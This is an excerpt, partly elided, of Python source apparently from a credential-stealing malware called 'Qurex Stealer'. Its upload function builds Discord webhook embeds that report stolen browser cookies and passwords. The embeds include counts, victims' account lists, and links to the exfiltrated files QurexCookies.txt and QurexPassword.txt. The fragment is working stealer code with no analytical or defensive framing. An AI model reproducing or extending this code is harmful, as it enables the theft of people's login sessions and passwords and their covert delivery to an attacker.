...
def upload(name, link):
    ...
    if name == "wpcook":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "Qurex | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [QurexCookies.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "Qurex Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
    ...
    if name == "wppassw":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "Qurex | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [QurexPassword.txt]({link})",
                    "color": 000000,
                    "footer": {
                        "text": "Qurex Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
